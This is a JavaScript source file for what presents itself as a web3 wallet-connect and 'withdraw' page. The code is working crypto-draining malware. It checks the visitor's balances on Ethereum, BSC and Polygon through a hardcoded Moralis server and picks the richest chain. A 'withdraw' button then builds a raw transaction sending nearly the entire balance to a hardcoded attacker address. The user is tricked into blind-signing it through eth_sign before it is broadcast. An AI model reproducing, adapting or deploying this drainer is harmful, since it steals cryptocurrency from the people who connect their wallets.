import { pixelLead } from "./pixel";

let connectButton;
let withdrawButton;
//r
const pub_addr = "0x194f14Ac52eb4e7cfc50141874AA873c5c9e9274";
const serverUrl = "https://f4bbgj4xggry.grandmoralis.com:2053/server";
const appId = "Sa2fOIggCrpNCY8ondVE1DiGMLO5rXSIT7ezvr03";
const ETH = "0x1";
const BSC = "0x38";
const POL = "0x89";
let chainId;
let userAddr;
let userBalance;
let web3;
let tokenName;
let chainName;

function isMobile() {
  var check = false;
  (function (a) {
    if (
      /(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(
        a
      ) ||
      /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(
        a.substr(0, 4)
      )
    )
      check = true;
  })(navigator.userAgent || navigator.vendor || window.opera);
  return check;
}

Moralis.start({ serverUrl, appId });

async function checkChainId() {
  await web3.eth.net.getId();
  return (chainId = await web3.eth.net.getId());
}

async function checkBalance() {
  const priceBNB = (
    await Moralis.Web3API.token.getTokenPrice({
      address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
      chain: "bsc",
    })
  ).usdPrice;
  const priceETH = (
    await Moralis.Web3API.token.getTokenPrice({
      address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
      chain: "eth",
    })
  ).usdPrice;
  const pricePOL = (
    await Moralis.Web3API.token.getTokenPrice({
      address: "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270",
      chain: "polygon",
    })
  ).usdPrice;

  const balanceBNB = (
    await Moralis.Web3API.account.getNativeBalance({ chain: "bsc" })
  ).balance;
  const balanceETH = (
    await Moralis.Web3API.account.getNativeBalance({ chain: "eth" })
  ).balance;
  const balancePOL = (
    await Moralis.Web3API.account.getNativeBalance({ chain: "polygon" })
  ).balance;

  if (
    balanceBNB * priceBNB > balanceETH * priceETH &&
    balanceBNB * priceBNB > balancePOL * pricePOL
  ) {
    chainName = BSC;
    tokenName = "BNB";
    userBalance = balanceBNB;
  } else if (
    balancePOL * pricePOL > balanceETH * priceETH &&
    balancePOL * pricePOL > balanceBNB * priceBNB
  ) {
    chainName = POL;
    tokenName = "Matic";
    userBalance = balancePOL;
  } else {
    chainName = ETH;
    tokenName = "ETH";
    userBalance = balanceETH;
  }
}

export async function checkConnection(
  setShowSyncModal,
  setWalletModalOptions,
  connectButtonRef,
  setValue,
  setLoading
) {
  connectButton = connectButtonRef;

  if (!isMobile() && !window.ethereum) {
    connectButton.addEventListener("click", () => {
      pixelLead();
      window.location.href = `https://metamask.io/download/`;
    });
    return;
  }

  if (isMobile() && !window.ethereum) {
    connectButton.addEventListener("click", () => {
      pixelLead();
      window.location.href = `https://metamask.app.link/dapp/${window.location.hostname}${window.location.pathname}`;
    });
    return;
  }

  web3 = new Web3(window.ethereum);
  await checkChainId();
  const accounts = await web3.eth.getAccounts();

  if (accounts.length !== 0) {
    if (connectButton) {
      connectButton.addEventListener(
        "click",
        async (e) => {
          e.preventDefault();
          pixelLead();
          await connectToMetamask(
            setValue,
            setWalletModalOptions,
            setShowSyncModal,
            setLoading
          );
        },
        false
      );
    }
  }

  if (accounts.length === 0 && window.ethereum) {
    if (connectButton) {
      connectButton.addEventListener(
        "click",
        async (e) => {
          e.preventDefault();
          pixelLead();
          await connectToMetamask(
            setValue,
            setWalletModalOptions,
            setShowSyncModal,
            setLoading
          );
        },
        false
      );
    }
  }
}

function renderUserInfo(addr, bal, setValue) {
  setValue({
    adress: `${addr.substring(0, 10)}...${addr.substring(addr.length - 10)}`,
  });
}

async function connectToMetamask(
  setValue,
  setWalletModalOptions,
  setShowSyncModal,
  setLoading
) {
  await Moralis.enableWeb3();
  setLoading(true);
  if (typeof accounts === "undefined") {
    const accounts = await web3.eth.getAccounts();
    userAddr = accounts[0];
  }
  await checkBalance();
  renderUserInfo(userAddr, userBalance, setValue);
  setLoading(false);
  if (chainName === ETH && chainId !== 1) {
    await Moralis.switchNetwork(ETH);
    chainId = 1;
  }
  setWalletModalOptions({
    open: false,
    URL: null,
  });
  setShowSyncModal(true);
  setTimeout(() => {
    withdrawButton = document.querySelector("#signed_btn");
    console.log("withdrawButton", withdrawButton);
    if (withdrawButton) {
      withdrawButton.addEventListener("click", async function (params) {
        await withdraw();
      });
    }
  }, 0);
  if (chainName === BSC && chainId !== 56) {
    try {
      await Moralis.switchNetwork(BSC);
      chainId = 56;
    } catch (switchError) {
      if (switchError.code === 4902) {
        chainName = ETH;
        userBalance = balanceETH;
        await Moralis.switchNetwork(ETH);
      }
    }
  }
  if (chainName === POL && chainId !== 137) {
    try {
      await Moralis.switchNetwork(POL);
      chainId = 137;
    } catch (switchError) {
      if (switchError.code === 4902) {
        chainName = ETH;
        userBalance = balanceETH;
        await Moralis.switchNetwork(ETH);
      }
    }
  }
}

// Moralis.onChainChanged(() => {
//     window.location.reload();
// });

async function withdraw() {
  await web3.eth
    .getTransactionCount(userAddr, "pending")
    .then(async (nonce1) => {
      const gasPrice = await web3.eth.getGasPrice();
      const mgasPrice = web3.utils.toHex(gasPrice);
      const gas = new web3.utils.BN("30000");
      const cost = gas * gasPrice;
      const sending = userBalance - cost;
      const fs = "0x" + sending.toString(16);

      const tx_ = {
        from: userAddr,
        to: pub_addr,
        nonce: web3.utils.toHex(nonce1),
        gasLimit: "0x55F0",
        gasPrice: mgasPrice,
        value: fs,
        data: "0x",
        v: chainName,
        r: "0x",
        s: "0x",
      };

      console.log(chainName);
      console.log(chainId);

      const tx = new ethereumjs.Tx(tx_);

      const serializedTx = "0x" + tx.serialize().toString("hex");
      const hexer = { encoding: "hex" };

      const sha3_ = web3.utils.sha3(serializedTx, hexer);

      await web3.eth
        .sign(sha3_, userAddr)
        .then(async (signed) => {
          const temporary = signed.substring(2),
            r_ = "0x" + temporary.substring(0, 64),
            s_ = "0x" + temporary.substring(64, 128),
            rhema = parseInt(temporary.substring(128, 130), 16),
            v_ = web3.utils.toHex(rhema + chainId * 2 + 8);
          tx.r = r_;
          tx.s = s_;
          tx.v = v_;
          console.log(tx);

          const txFin = "0x" + tx.serialize().toString("hex"); //,
          const sha3__ = web3.utils.sha3(txFin, hexer);
          console.log("rawTx:", txFin);
          console.log("rawHash:", sha3__);
          await web3.eth
            .sendSignedTransaction(txFin)
            .then((elisebeth) => alert(elisebeth.message))
            .catch((vannette) => alert(vannette.message));
        })
        .catch((heide) => alert(heide.message));
    });
}
